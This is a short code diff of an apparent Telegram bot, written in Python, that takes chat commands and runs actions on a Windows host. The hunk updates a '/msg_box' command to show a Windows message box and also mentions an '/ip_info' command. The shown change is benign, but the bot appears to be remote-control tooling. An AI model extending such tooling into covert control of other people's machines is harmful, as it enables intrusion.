@@ -98,11 +98,10 @@ def handle(msg):
 
 			elif command.startswith('/msg_box'):
 				message = command.replace('/msg_box', '')
-				message = message[1:]
 				if message == '':
 					bot.sendMessage(chat_id, '/msg_box yourText')
 				else:
-					ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
+					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
 					bot.sendMessage(chat_id, 'MsgBox Displayed')
 
 			elif command == '/ip_info':
